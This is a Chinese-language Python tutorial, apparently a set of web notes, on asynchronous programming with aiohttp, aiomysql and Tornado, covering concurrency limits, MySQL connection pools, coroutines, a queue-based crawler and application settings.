上面介绍了访问不同链接的异步实现方式,但只发出了请求,可通过asyncio.gather(*tasks)将响应一一收集到一个列表中,最后保存到本地或打印出来

</pre><textarea>
import time, asyncio
from aiohttp import ClientSession

tasks = []
url = "https://www.baidu.com/{}"
async def hello(url):
    async with ClientSession() as session:
        async with session.get(url) as response:
            # print(response)
            print('Hello World:%s' % time.time())
            return await response.read()

def run():
    for i in range(5):
        Task= asyncio.ensure_future(hello(url.format(i)))
        tasks.append(task)
    result = loop.run_until_complete(asyncio.gather(*tasks))
    print(result)
    for re in result: print(re.decode())

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    run()

</textarea><pre>
异常解决
假如并发达到2000个程序会报错:ValueError: too many file descriptors in select(),原因是Python调取的select对打开的文件有最大数量的限制,这个其实是操作系统的限制,linux打开文件的最大数默认1024,windows默认509,超过了这个值程序就开始报错。有三种方法解决这个问题:
1.限制并发数量,一次不要塞那么多任务或限制最大并发数量,推荐限制并发数的方法,设置并发数为500,处理速度更快
2.使用回调的方式。
3.修改操作系统打开文件数的最大限制,在系统里有个配置文件可以修改默认值

</pre><textarea>
import time,asyncio,aiohttp

url = 'https://www.baidu.com/'
async def hello(url,semaphore):
    async with semaphore:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                return await response.read()

async def run():
    semaphore = asyncio.Semaphore(500) # 限制并发量为500
    to_get = [hello(url.format(),semaphore) for _ in range(1000)] #总共1000任务
    await asyncio.wait(to_get)

if __name__ == '__main__':
    # now=lambda :time.time()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(run())
    loop.close()

</textarea><textarea>
import asyncio
import aiohttp
from lxml import etree
import logging


class AsnycGrab(object):
   def __init__(self, url_list, max_threads):
       self.urls = url_list
       self.results = {}
       self.max_threads = max_threads

   def __parse_results(self, url, html):
       try:
           html = etree.HTML(html)
           title = html.xpath('//title/text()')
       except Exception as e:
           raise e

       if title:
           self.results[url] = title

   async def get_body(self, url):
       async with aiohttp.ClientSession() as session:
           async with session.get(url, timeout=30) as response:
               assert response.status == 200
               html = await response.read()
               return response.url, html

   async def get_results(self, url):
       url, html = await self.get_body(url)
       self.__parse_results(url, html)
       return 'Completed'

   async def handle_tasks(self, task_id, work_queue):
       while not work_queue.empty():
           current_url = await work_queue.get()
           try:
               task_status = await self.get_results(current_url)
           except Exception as e:
               logging.exception('Error for {}'.format(current_url), exc_info=True)

   def eventloop(self):
       q = asyncio.Queue()  # 队列通信的功能
       [q.put_nowait(url) for url in self.urls]
       loop = asyncio.get_event_loop()
       tasks = [self.handle_tasks(task_id, q, ) for task_id in range(self.max_threads)]
       loop.run_until_complete(asyncio.wait(tasks))
       loop.close()


if __name__ == '__main__':
   async_example = AsnycGrab(['https://www.taobao.com/',
              'https://www.toutiao.com',
              'https://github.com/',
              'https://www.baidu.com/',
              'https://www.zhihu.com/'], 5)
   async_example.eventloop()
   print(async_example.results)

</textarea>
</div>

<div id="aiomysql">
<h4>aiomysql</h4><pre>
aiomysql is a "driver" for accessing a MySQL database from the asyncio framework. It depends on and reuses most parts of PyMySQL. aiomysql tries to be like awesome aiopg library and preserve same api, look and feel.

Internally aiomysql is copy of PyMySQL, underlying io calls switched to async, basically yieldfromand asyncio.coroutine added in proper places)). sqlalchemy support portedfromaiopg.

</pre><textarea>
import asyncio
import aiomysql

async def test_example(loop):
    pool = await aiomysql.create_pool(host='127.0.0.1', port=3306, user='admin', password='', db='mysql', loop=loop)
    async with pool.acquire() as conn:
        async with conn.cursor() as cur:
            await cur.execute("SELECT 42;")
            print(cur.description)
            (r,) = await cur.fetchone()
            assert r == 42
    pool.close()
    await pool.wait_closed()

loop = asyncio.get_event_loop()
loop.run_until_complete(test_example(loop))

</textarea><textarea>
import asyncio
from aiomysql import create_pool

async def go():
    async with create_pool(host='127.0.0.1', port=3306, user='admin', password='', db='mysql', loop=loop) as pool:
        async with pool.acquire() as conn:
            async with conn.cursor() as cur:
                await cur.execute("SELECT 42;")
                value = await cur.fetchone()
                print(value)

loop = asyncio.get_event_loop()
loop.run_until_complete(go())

</textarea><textarea>
import traceback
import logging
import aiomysql
import asyncio
logobj = logging.getLogger('mysql')

class Pmysql:
    def __init__(self):
        self.coon = None
        self.pool = None

    async def initpool(self):
        try:
            logobj.debug("will connect mysql~")
            __pool = await aiomysql.create_pool(minsize=5, maxsize=10,host='127.0.0.1', port=3306, user='root', password='123456', db='mytest', autocommit=False)
            return __pool
        except:
            logobj.error('connect error.', exc_info=True)

    async def getCurosr(self):
        conn = await self.pool.acquire()
        cur = await conn.cursor()
        return conn, cur

    async def query(self, query,param=None):
        conn, cur = await self.getCurosr()
        try:
            await cur.execute(query,param)
            return await cur.fetchall()
        except:
            logobj.error(traceback.format_exc())
        finally:
            if cur: await cur.close()
            await self.pool.release(conn)  # 释放掉conn,将连接放回到连接池中

async def test():
    mysqlobj = await getAmysqlobj()
    r = await mysqlobj.query("select * from person")
    for i in r: print(i)
    await asyncio.sleep(6)
    r2 = await mysqlobj.query("select * from person where id = (%s)",(1,))
    print(r2)

async def getAmysqlobj():
    mysqlobj = Pmysql()
    pool = await mysqlobj.initpool()
    mysqlobj.pool = pool
    return mysqlobj

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(test())

</textarea><pre>
【 不使用连接池 】
# connect(host="localhost", user=None, password="", db=None, port=3306, unix_socket=None, charset='', sql_mode=None, read_default_file=None, conv=decoders, use_unicode=None, client_flag=0, cursorclass=Cursor, init_command=None, connect_timeout=None, read_default_group=None, no_delay=None, autocommit=False, echo=False, local_infile=False, loop=None)

这个方法接受了所有来自pymsql.connect()的参数,并加上了关键字循环参数和超时参数。

字符串参数 host： 数据库服务所在的主机的地址。 默认为"localhost"
字符串参数 user：登录数据库的用户名
字符串参数 password：对应用户名的密码
字符串参数 db: 要使用的数据库, 如果没有指定不会使用其他的,报错。
整型参数 port：MySQL服务使用的端口,一般默认的就可以(3306).
字符串参数 unix_socket：可选的,你可以使用一个unix的socket,而不是一个TCP/IP。
字符串参数 charset： 指定你想要使用的编码格式,例如"utf8"。
参数 sql_model：默认使用的SQL模式,例如"NO_BACKSLASH_ESCAPES"
参数 read_default_file： 指定读取[client]部分的my.cnf文件。
参数 conv：使用指定编码器替代默认编码器,通常用来定制一些类型。 具体参考pymysql.converters
参数 user_unicode： 是否使用默认的unicode字符串
参数 client_flag： 自定义发送给mysql的flag,从pymysql.constants.CLIENT中可以找到相应的值。
参数 cursorclass：自定义使用的游标类
参数 str init_command：连接建立的时候执行的SQL初始化语句。
参数 connect_timeout：连接中抛出异常前的保持时间。
字符串参数 read_default_group：从配置文件中读取的分组信息
布尔参数 no_delay：禁止使用socket连接的纳格算法
参数 autocommit：自动提交模式,指定为None使用默认的值(default: False)
参数 loop：异步循环事件的实例,或者指定为None使用默认的实例。
return：返回值是一个连接的实例

</pre><textarea>
import aiomysql, asyncio, logging, traceback

logobj = logging.getLogger('mysql')

class Pmysql:
    __connection = None

    def __init__(self):
        self.cursor = None
        self.connection = None

    # 由于aiomysql.connect是异步的,在python里__init__方法不能使用async关键词,也就是在对象的初始化时不能异步,所以将获取连接的操作单独的使用单例模式来创建一个连接,当然也可以不使用单例,每次进行查询的时候都重新获取一个新的连接connection
    @staticmethod
    async def getconnection():
        if Pmysql.__connection == None:
            conn = await aiomysql.connect(host='127.0.0.1',port=3306,user='admin',password='',db='python',)
            if conn:
                Pmysql.__connection = conn
                return conn
            else:
                raise("connect to mysql error ")
        else:
            return Pmysql.__connection

    async def query(self,query,args=None):
        self.cursor = await self.connection.cursor()
        await self.cursor.execute(query,args)
        r = await self.cursor.fetchall()
        await self.cursor.close()
        return r

async def test():
    conn = await Pmysql.getconnection()
    mysqlobj.connection = conn
    await conn.ping()
    r = await mysqlobj.query("select * from person")
    for i in r:
        print(i)
    conn.close()

if __name__ == '__main__':
    mysqlobj = Pmysql()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(test())

</textarea><pre>
处理连接无操作超时问题
如果某个连接在一段时间内无操作,mysql会主动断开这个连接,当再次使用该connection的cursor对象进行查询操作时,由于mysql服务已经将该连接关闭,所以会得到2013, 'Lost connection to MySQL server during query'错误
解决方法是在进行查询操作之前,先使用connection.ping()方法来检查一下连接是否有效,该方法默认会在连接无效的时候进行重新连接

</pre><textarea>
import aiomysql, asyncio, logging, traceback
logobj = logging.getLogger('mysql')

class Pmysql:
    __connection = None

    def __init__(self):
        self.cursor = None
        self.connection = None

    @staticmethod
    async def getconnection():
        if Pmysql.__connection == None:
            conn = await aiomysql.connect(host='127.0.0.1',port=3306,user='root',password='123456',db='mytest',)
            if conn:
                Pmysql.__connection = conn
                return conn
            else:
                raise("connect to mysql error ")
        else:
            return Pmysql.__connection

    async def query(self,query,args=None):
        self.cursor = await self.connection.cursor()
        await self.connection.ping()  #每次进行查询操作时都先执行一下ping()方法来检查一下连接是否有效
        await self.cursor.execute(query,args)
        r = await self.cursor.fetchall()
        await self.cursor.close()
        return r

async def test():
    conn = await Pmysql.getconnection()
    mysqlobj.connection = conn
    r = await mysqlobj.query("select * from person")
    for i in r: print(i)
    await asyncio.sleep(6)
    r2 = await mysqlobj.query("select * from person")
    for i in r2: print(i)
    conn.close()

if __name__ == '__main__':
    mysqlobj = Pmysql()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(test())

</textarea><pre>
异步地执行多个查询
异步的操作的优势在于它可以"同时"的进行多个操作,如果查询只是一个一个的单独查询,那用不用异步其实都无所谓,这里尝试使用异步来同时执行多个操作

</pre>id(conn)查看连接是否是同一个对象,因为使用了单例模式,结果不是同一个对象<textarea>
async def test():
    conn = await Pmysql.getaconnection()
    print("test...",id(conn))
    mysqlobj.connection = conn
    r = await mysqlobj.query("select * from person")
    # mysqlobj.connection.close()
    return r

async def test2():
    await asyncio.sleep(0.1)
    conn = await Pmysql.getconnection()
    print("test2..",id(conn))
    mysqlobj.connection = conn
    r = await mysqlobj.query("select * from person where id=(%s)",(1,))
    # mysqlobj.connection.close()
    return r

async def querysum():
    result = await asyncio.gather(test(),test2())
    for i in result:
        print(i)

if __name__ == '__main__':
    mysqlobj = Pmysql()
    loop = asyncio.get_event_loop()
    loop.run_until_complete(querysum())
    mysqlobj.connection.close()

</textarea>Example of SQLAlchemy optional integration<textarea>
import asyncio
import sqlalchemy as sa
from aiomysql.sa import create_engine

metadata = sa.MetaData()

tbl = sa.Table('tbl', metadata, sa.Column('id', sa.Integer, primary_key=True), sa.Column('name', sa.String(255)))

async def go(loop):
    engine = await create_engine(user='admin', db='python', host='127.0.0.1', password='', loop=loop)
    async with engine.acquire() as conn:
        await conn.execute(tbl.insert().values(name='abc'))
        await conn.execute(tbl.insert().values(name='xyz'))

        async for row in conn.execute(tbl.select()):
            print(row.id, row.name)

    engine.close()
    await engine.wait_closed()

loop = asyncio.get_event_loop()
loop.run_until_complete(go(loop))

</textarea>
</div>

<div id="tornado">
<h3>tornado</h3><pre>
Tornado是一个Python web框架和异步网络库,起初由FriendFeed开发. 通过使用非阻塞网络I/O,Tornado可以支撑上万级的连接,处理长连接,WebSockets,和其他需要与每个用户保持长久连接的应用

Tornado大体上可以被分为4个主要的部分:
1、tornado.web：tornado的基础web框架
RequestHandler：封装对请求处理的所有信息和处理方法
get/post/..：封装对应的请求方式
write()：封装响应信息,写响应信息的一个方法

2、HTTP的客户端和服务端实现,HTTPServer and AsyncHTTPClient

3、异步网络库(IOLoop and IOStream),为HTTP组件提供构建模块,也可以用来实现其他协议
tornado.ioloop：核心io循环模块,封装linux的epoll和BSD的kqueue,tornado高性能处理的核心。
current()返回当前线程的IOLoop实例对象
start()启动IOLoop实力对象的IO循环,开启监听

4、协程库(tornado.gen)允许异步代码写的更直接而不用链式回调的方式

Tornado web框架和HTTP server一起为WSGI提供了一个全栈式的选择,在WSGI容器(WSGIAdapter)中使用Tornado web框架或使用Tornado HTTP server作为一个其他WSGI框架(WSGIContainer)的容器,这样的组合方式都是有局限性的. 为了充分利用Tornado的特性,需要一起使用Tornado的web框架和HTTP server

pip install tornado

可选依赖：
unittest2用来在Python 2.6上运行Tornado的测试用例的,更高版本的Python不需要
concurrent.futures是推荐配合Tornado使用的线程池并且可以支持tornado.netutil.ThreadedResolver的用法,它只在Python2中被需要,Python3已经包括了这个标准库
pycurl是在tornado.curl_httpclient中可选使用的.需要Libcurl 7.19.3.1或更高版本;推荐使用7.21.1或更高版本
Twisted 会在tornado.platform.twisted中使用
pycares是一个当线程不适用情况下的非阻塞DNS解决方案.
Monotime添加对monotonic clock的支持,当环境中的时钟被频繁调整的时候,改善其可靠性. 在Python3.3中不再需要

【 异步和非阻塞I/O 】
实时web功能需要为每个用户提供一个多数时间被闲置的长连接,在传统的同步web服务器中这意味着要为每个用户提供一个线程,当然每个线程的开销都是很昂贵的

为了尽量减少并发连接造成的开销,Tornado使用了一种单线程事件循环的方式,这就意味着所有的应用代码都应该是异步非阻塞的,因为在同一时间只有一个操作是有效的.

异步和非阻塞是非常相关的并且这两个术语经常交换使用,但它们不是完全相同的事情

阻塞
一个函数在等待某些事情的返回值的时候会被阻塞,函数被阻塞的原因有很多:网络I/O,磁盘I/O,互斥锁等,事实上每个函数在运行和使用CPU的时候都或多或少会被阻塞,举个极端的例子来说明为什么对待CPU阻塞要和对待一般阻塞一样的严肃: 比如密码哈希函数bcrypt需要消耗几百毫秒的CPU时间,这已经远远超过了一般的网络或磁盘请求时间了

一个函数可以在某些方面阻塞在另外一些方面不阻塞,如tornado.httpclient在默认的配置下会在DNS解析上面阻塞,但在其他网络请求的时候不阻塞 (为了减轻这种影响,可以用ThreadedResolver或通过正确配置libcurl用tornado.curl_httpclient来做),在Tornado的上下文中,一般讨论网络I/O上下文的阻塞,尽管各种阻塞已经被最小化

异步
异步函数会在完成之前返回,在应用中触发下一个动作之前通常会在后台执行一些工作(和正常的同步函数在返回前就执行完所有的事情不同),这里列举了几种风格的异步接口:
1、回调参数
2、返回一个占位符(Future, Promise, Deferred)
3、传送给一个队列
4、回调注册表(POSIX信号)

不论使用哪种类型的接口, 按照定义异步函数与它们的调用者都有着不同的交互方式;也没有什么对调用者透明的方式使得同步函数异步(类似gevent 使用轻量级线程的系统性能虽然堪比异步系统,但它们并没有真正的让事情异步)

# 一个简单的同步函数
from tornado.httpclient import HTTPClient
def synchronous_fetch(url):
    http_client = HTTPClient()
    response = http_client.fetch(url)
    return response.body

# 把上面的例子用回调参数重写的异步函数
from tornado.httpclient import AsyncHTTPClient
def asynchronous_fetch(url, callback):
    http_client = AsyncHTTPClient()
    def handle_response(response):
        callback(response.body)
    http_client.fetch(url, callback=handle_response)

# 使用Future代替回调
from tornado.concurrent import Future
def async_fetch_future(url):
    http_client = AsyncHTTPClient()
    my_future = Future()
    fetch_future = http_client.fetch(url)
    fetch_future.add_done_callback(
        lambda f: my_future.set_result(f.result()))
    return my_future

Future版本明显更加复杂,但Futures却是Tornado中推荐的写法 因为它有两个主要的优势,首先是错误处理更加一致,因为Future.result方法可以简单的抛出异常(相较于常见的回调函数接口特别指定错误处理), 而且Futures很适合和协程一起使用

# 协程版本,和最初的同步版本很像:
from tornado import gen

@gen.coroutine
def fetch_coroutine(url):
    http_client = AsyncHTTPClient()
    response = yield http_client.fetch(url)
    raise gen.Return(response.body)

raise gen.Return(response.body)声明是在Python2(and 3.2)下人为执行的,因为在其中生成器不允许返回值.为了克服这个问题,Tornado的协程抛出一种特殊的叫Return的异常,协程捕获这个异常并把它作为返回值. 在Python3.3和更高版本,使用return response.body有相同的结果

【 协程 】
Tornado中推荐使用协程写异步代码,协程使用了Python的yield关键字代替链式回调来将程序挂起和恢复执行(像在gevent中出现的轻量级线程合作方式有时也被称为协程, 但在Tornado中所有的协程使用明确的上下文切换,并被称为异步函数)

使用协程几乎像写同步代码一样简单, 并且不需要浪费额外的线程,它们还通过减少上下文切换来使并发编程更简单

</pre><textarea>
from tornado import gen

@gen.coroutine
def fetch_coroutine(url):
    http_client = AsyncHTTPClient()
    response = yield http_client.fetch(url)
    # 在Python3.3之前,在generator中是不允许有返回值的,必须通过抛出异常来代替,就像 raise gen.Return(response.body)
    return response.body

</textarea><pre>
Python3.5引入了async和await关键字(使用这些关键字的函数也被称为"原生协程").从Tornado4.3可以用它们代替yield为基础的协程,只需要简单的使用async def foo() 在函数定义的时候代替@gen.coroutine装饰器, 用await代替yield

</pre><textarea>
async def fetch_coroutine(url):
    http_client = AsyncHTTPClient()
    response = await http_client.fetch(url)
    return response.body

</textarea><pre>
await关键字比yield关键字功能要少一些,例如在一个使用yield的协程中可以得到Futures列表,但在原生协程中必须把列表用tornado.gen.multi包起来,也可以使用tornado.gen.convert_yielded来把任何使用yield工作的代码转换成使用await的形式

虽然原生协程没有明显依赖于特定框架(例如它们没有使用装饰器,例如tornado.gen.coroutine或asyncio.coroutine), 不是所有的协程都和其他的兼容,有一个协程执行者(coroutine runner) 在第一个协程被调用的时候进行选择, 然后被所有用await直接调用的协程共享. Tornado的协程执行者(coroutine runner)在设计上是多用途的,可以接受任何来自其他框架的awaitable对象;其他的协程运行时可能有很多限制(例如asyncio协程执行者不接受来自其他框架的协程),基于这些原因,推荐组合了多个框架的应用都使用Tornado的协程执行者来进行协程调度,为了能使用Tornado来调度执行asyncio的协程,可以使用tornado.platform.asyncio.to_asyncio_future适配器

工作原理
包含了yield关键字的函数是一个生成器(generator),所有的生成器都是异步的;当调用它们的时候会返回一个生成器对象,而不是一个执行完的结果,@gen.coroutine装饰器通过yield表达式和生成器进行交流, 而且通过返回一个Future与协程的调用方进行交互

</pre><textarea>
# tornado.gen.Runner 简化的内部循环
def run(self):
    # send(x) makes the current yield return x. It returns when the next yield is reached
    future = self.gen.send(self.next)
    def callback(f):
        self.next = f.result()
        self.run()
    future.add_done_callback(callback)

</textarea><pre>
装饰器从生成器接收一个Future对象,等待(非阻塞的)这个Future对象执行完成,然后"解开(unwraps)" 这个Future对象,并把结果作为yield表达式的结果传回给生成器.大多数异步代码从来不会直接接触Future类 除非Future立即通过异步函数返回给yield表达式

调用协程
协程一般不会抛出异常:它们抛出的任何异常将被Future捕获直到它被得到,这意味着用正确的方式调用协程是重要的,否则可能有被忽略的错误
通常任何一个调用协程的函数都必须是协程它自身,并且在调用的时候使用yield关键字,当复写超类中的方法请参阅文档看看协程是否支持

@gen.coroutine
def divide(x, y):
    return x / y

def bad_call():
    divide(1, 0)  # 这里应该抛出一个ZeroDivisionError的异常, 但事实上并没有,因为协程的调用方式是错误的

@gen.coroutine
def good_call():
    yield divide(1, 0)  # yield将会解开divide()返回的Future并且抛出异常

有时可能想要对一个协程"一劳永逸"而且不等待它的结果,在这种情况下建议使用IOLoop.spawn_callback,它使得IOLoop负责调用,如果它失败了,IOLoop会在日志中把调用栈记录下来:
# IOLoop 将会捕获异常,并且在日志中打印栈记录.注意这不像是一个正常的调用, 因为我们是通过IOLoop 调用的这个函数.
IOLoop.current().spawn_callback(divide, 1, 0)
最后在程序顶层如果`.IOLoop`尚未运行,可以启动IOLoop,执行协程,然后使用IOLoop.run_sync方法停止IOLoop,这通常被用来启动面向批处理程序的main函数:
IOLoop.current().run_sync(lambda: divide(1, 0)) # run_sync()不接收参数,所以必须把调用包在lambda函数中

【 协程模式 】
结合callback
为了使用回调而不是Future与异步代码进行交互,把调用包在Task中,这将添加一个回调参数并且返回一个可以yield的Future :
@gen.coroutine
def call_task():
    # 注意这里没有传进来some_function,这里会被Task翻译成some_function(other_args, callback=callback)
    yield gen.Task(some_function, other_args)

调用阻塞函数
从协程调用阻塞函数最简单的方式是使用ThreadPoolExecutor,它将返回和协程兼容的Futures
thread_pool = ThreadPoolExecutor(4)

@gen.coroutine
def call_blocking():
    yield thread_pool.submit(blocking_func, args)

并行
协程装饰器能识别列表或者字典对象中各自的Futures,并且并行的等待这些Futures :

@gen.coroutine
def parallel_fetch(url1, url2):
    resp1, resp2 = yield [http_client.fetch(url1), http_client.fetch(url2)]

@gen.coroutine
def parallel_fetch_many(urls):
    responses = yield [http_client.fetch(url) for url in urls]
    # 响应是和HTTPResponses相同顺序的列表

@gen.coroutine
def parallel_fetch_dict(urls):
    responses = yield {url: http_client.fetch(url) for url in urls} # 响应是一个字典 {url: HTTPResponse}

交叉存取
有时候保存一个Future比立即yield它更有用, 所以可以在等待之前执行其他操作:

@gen.coroutine
def get(self):
    fetch_future = self.fetch_next_chunk()
    while True:
        chunk = yield fetch_future
        if chunk is None: break
        self.write(chunk)
        fetch_future = self.fetch_next_chunk()
        yield self.flush()

循环
协程的循环是棘手的,因为在Python中没有办法在for循环或while循环yield迭代器,并且捕获yield的结果,相反,需要将循环条件从访问结果中分离出来, 下面是一个使用Motor的例子:

import motor
db = motor.MotorClient().test

@gen.coroutine
def loop_example(collection):
    cursor = db.collection.find()
    while (yield cursor.fetch_next):
        doc = cursor.next_object()

在后台运行
PeriodicCallback通常不使用协程,相反,一个协程可以包含一个while True:循环并使用tornado.gen.sleep:

@gen.coroutine
def minute_loop():
    while True:
        yield do_something()
        yield gen.sleep(60)

# Coroutines that loop forever are generally started with
# spawn_callback().
IOLoop.current().spawn_callback(minute_loop)

有时可能会遇到一个更复杂的循环,例如上一个循环运行每次花费60+N秒,其中N是do_something()花费的时间.为了准确的每60秒运行,使用上面的交叉模式:

@gen.coroutine
def minute_loop2():
    while True:
        nxt = gen.sleep(60)   # 开始计时.
        yield do_something()  # 计时后运行.
        yield nxt             # 等待计时结束.

【 Queue示例：一个并发网络爬虫 】
Tornado的tornado.queues模块实现了异步生产者/消费者模式的协程,类似于通过Python标准库的queue实现线程模式.
一个yield Queue.get的协程直到队列中有值的时候才会暂停,如果队列设置了最大长度yield Queue.put的协程直到队列中有空间才会暂停
一个Queue从0开始对完成的任务进行计数,put加计数;task_done减少计数

这里的网络爬虫的例子,队列开始的时候只包含base_url,当一个worker抓取到一个页面它会解析链接并把它添加到队列中,然后调用task_done减少计数一次,最后当一个worker抓取到的页面URL都是之前抓取到过的并且队列中没有任务了,于是worker调用task_don把计数减到0,等待join的主协程取消暂停并且完成

</pre><textarea>
import time
from datetime import timedelta

try:
    from HTMLParser import HTMLParser
    from urlparse import urljoin, urldefrag
except ImportError:
    from html.parser import HTMLParser
    from urllib.parse import urljoin, urldefrag

from tornado import httpclient, gen, ioloop, queues

base_url = 'http://www.tornadoweb.org/en/stable/'
concurrency = 10

@gen.coroutine
def get_links_from_url(url):
    """Download the page at `url` and parse it for links.Returned links have had the fragment after `#` removed, and have been made absolute so, e.g. the URL 'gen.html#tornado.gen.coroutine' becomes 'http://www.tornadoweb.org/en/stable/gen.html'.
    """
    try:
        response = yield httpclient.AsyncHTTPClient().fetch(url)
        print('fetched %s' % url)

        html = response.body if isinstance(response.body, str) else response.body.decode()
        urls = [urljoin(url, remove_fragment(new_url)) for new_url in get_links(html)]
    except Exception as e:
        print('Exception: %s %s' % (e, url))
        raise gen.Return([])
    raise gen.Return(urls)

def remove_fragment(url):
    pure_url, frag = urldefrag(url)
    return pure_url

def get_links(html):
    class URLSeeker(HTMLParser):
        def __init__(self):
            HTMLParser.__init__(self)
            self.urls = []

        def handle_starttag(self, tag, attrs):
            href = dict(attrs).get('href')
            if href and tag == 'a': self.urls.append(href)

    url_seeker = URLSeeker()
    url_seeker.feed(html)
    return url_seeker.urls

@gen.coroutine
def main():
    q = queues.Queue()
    start = time.time()
    fetching, fetched = set(), set()

    @gen.coroutine
    def fetch_url():
        current_url = yield q.get()
        try:
            if current_url in fetching: return

            print('fetching %s' % current_url)
            fetching.add(current_url)
            urls = yield get_links_from_url(current_url)
            fetched.add(current_url)

            for new_url in urls:
                if new_url.startswith(base_url): yield q.put(new_url)  # Only follow links beneath the base URL

        finally:
            q.task_done()

    @gen.coroutine
    def worker():
        while True:
            yield fetch_url()

    q.put(base_url)

    # Start workers, then wait for the work queue to be empty.
    for _ in range(concurrency): worker()
    yield q.join(timeout=timedelta(seconds=300))
    assert fetching == fetched
    print('Done in %d seconds, fetched %s URLs.' % (time.time() - start, len(fetched)))

if __name__ == '__main__':
    import logging
    logging.basicConfig()
    io_loop = ioloop.IOLoop.current()
    io_loop.run_sync(main)

</textarea><pre>
【 Tornado web应用的结构 】
通常一个Tornado web应用包括一个或多个RequestHandler子类,一个可以将收到的请求路由到对应handler的Application对象,和一个启动服务的main()函数

</pre>没有使用Tornado的任何异步特性的hello world<textarea>
import tornado.ioloop
import tornado.web

class MainHandler(tornado.web.RequestHandler):
    def get(self):
        self.write("Hello, world")

def make_app():
    return tornado.web.Application([
        (r"/", MainHandler),
    ])

if __name__ == "__main__":
    app = make_app()
    app.listen(8888)
    tornado.ioloop.IOLoop.current().start()

</textarea><pre>
【 Application对象 应用程序配置 】
class tornado.web.Application(handlers=None, default_host='', transforms=None, **settings)
组成一个web应用程序的请求处理程序的集合,Application对象是负责全局配置的,包括映射请求转发给处理程序的路由表

</pre>该类的实例是可调用的并且可以被直接传递给HTTPServer为应用程序提供服务<textarea>
application = web.Application([
    (r"/", MainPageHandler),
])
http_server = httpserver.HTTPServer(application)
http_server.listen(8080)
ioloop.IOLoop.current().start()

</textarea><pre>
这个类的构造器带有一个列表包含URLSpec对象或(正则表达式, 请求类)元组,接收到请求时按顺序迭代该列表并且实例化和请求路径相匹配的正则表达式所对应的第一个请求类,请求类可以被指定为一个类对象或一个(完全有资格的)名字

每个元组可以包含另外的部分,只要符合URLSpec构造器参数的条件

一个字典可以作为该元组的第三个元素被传递,它将被用作处理程序构造器的关键字参数和initialize方法,这种模式也被用于例子中的StaticFileHandler,一个StaticFileHandler可以被自动挂载连带下面的static_path设置

application = web.Application([
    (r"/static/(.*)", web.StaticFileHandler, {"path": "/var/www"}),
])

支持虚拟主机通过add_handlers方法,该方法带有一个主机正则表达式作为第一个参数:

application.add_handlers(r"www\.myhost\.com", [
    (r"/article/([0-9]+)", ArticleHandler),
])

可以提供静态文件服务通过传递static_path配置作为关键字参数,将提供这些文件从/static/ URI (这是可配置的通过static_url_prefix配置),并且将提供/favicon.ico和/robots.txt从相同目录下,一个StaticFileHandler的自定义子类可以被指定,通过static_handler_class设置

路由表是URLSpec对象或元组的列表,其中每个都包含至少一个正则表达式和一个处理类
顺序问题; 第一个匹配的规则会被使用,如果正则表达式包含捕获组,这些组会被作为路径参数传递给处理函数的HTTP方法,如果一个字典作为URLSpec 的第三个参数被传递,它会作为初始参数传递给RequestHandler.initialize,最后URLSpec可能有一个名字,这将允许它被RequestHandler.reverse_url使用

Application构造函数有很多关键字参数可以用于自定义应用程序的行为和使用某些特性或功能

</pre>根URL/映射到了MainHandler,像/story/后跟着一个数字这种形式的URL被映射到了StoryHandler,这个数字作为字符串被传递给StoryHandler.get<textarea>
class MainHandler(RequestHandler):
    def get(self):
        self.write('< a href="%s">link to story 1< /a>' % self.reverse_url("story", "1"))

class StoryHandler(RequestHandler):
    def initialize(self, db):
        self.db = db

    def get(self, story_id):
        self.write("this is story %s" % story_id)

app = Application([
    url(r"/", MainHandler),
    url(r"/story/([0-9]+)", StoryHandler, dict(db=db), name="story")
])

</textarea><pre>
settings
传递给构造器的附加关键字参数保存在settings字典中,并经常在文档中被称为"application settings"
Settings被用于自定义Tornado的很多方面(虽然在一些情况下,更丰富的定制可能是通过在RequestHandler的子类中复写方法),一些应用程序也喜欢使用settings字典作为使一些处理程序可以使用应用程序的特定设置的方法,而无需使用全局变量,Tornado中使用的Setting描述如下.

一般设置(General settings):
autoreload
如果为True,服务进程将会在任意资源文件改变的时候重启,正如Debug模式和自动重载中描述的那样,这个选项是Tornado3.2中新增的;在这之前这个功能是由debug设置控制

debug
一些调试模式设置的速记,正如Debug模式和自动重载中描述的那样,debug=True设置等同于autoreload=True,compiled_template_cache=False,static_hash_cache=False,serve_traceback=True

default_handler_class和default_handler_args
如果没有发现其他匹配则会使用这个处理程序;使用这个来实现自定义404页面

compress_response
如果为True,以文本格式的响应将被自动压缩

gzip
不推荐使用的compress_response别名

log_function
这个函数将在每次请求结束的时候调用以记录结果(有一次参数,该RequestHandler对象),默认实现是写入logging模块的根logger,也可以通过复写Application.log_request自定义

serve_traceback
如果为true默认的错误页将包含错误信息的回溯,这个选项是在Tornado3.2中新增的;在此之前这个功能由debug设置控制

ui_modules和ui_methods
可以被设置为UIModule或UI methods的映射提供给模板,可以被设置为一个模块,字典或一个模块的列表和/或字典

认证和安全设置(Authentication and security settings):
cookie_secret
被RequestHandler.get_secure_cookie使用,set_secure_cookie用来给cookies签名

key_version
被requestHandler set_secure_cookie使用一个特殊的key给cookie签名当cookie_secret是一个key字典

login_url
authenticated装饰器将会重定向到这个url如果该用户没有登陆,更多自定义特性可以通过复写RequestHandler.get_login_url 实现

xsrf_cookies
如果true跨站请求伪造(防护)将被开启

xsrf_cookie_version
控制由该server产生的新XSRF cookie的版本,一般应在默认情况下(这将是最高支持的版本),但可以被暂时设置为一个较低的值,在版本切换之间

xsrf_cookie_kwargs
可设置为额外的参数字典传递给RequestHandler.set_cookie为该XSRF cookie

twitter_consumer_key, twitter_consumer_secret, friendfeed_consumer_key, friendfeed_consumer_secret, google_consumer_key, google_consumer_secret, facebook_api_key, facebook_secret
在tornado.auth模块中使用来验证各种APIs

模板设置:
autoescape
控制对模板的自动转义,可以被设置为None以禁止转义,或设置为一个所有输出都该传递过去的函数name,默认"xhtml_escape",可以在每个模板中改变使用{% autoescape %}指令

compiled_template_cache
默认True;如果是False模板将会在每次请求重新编译,这个选项是Tornado3.2中新增的,之前这个功能由debug设置控制

template_path
包含模板文件的文件夹,可以通过复写RequestHandler.get_template_path进一步定制

template_loader
分配给tornado.template.BaseLoader的一个实例自定义模板加载,如果使用了此设置则template_path和autoescape设置都会被忽略,可通过复写RequestHandler.create_template_loader进一步定制

template_whitespace
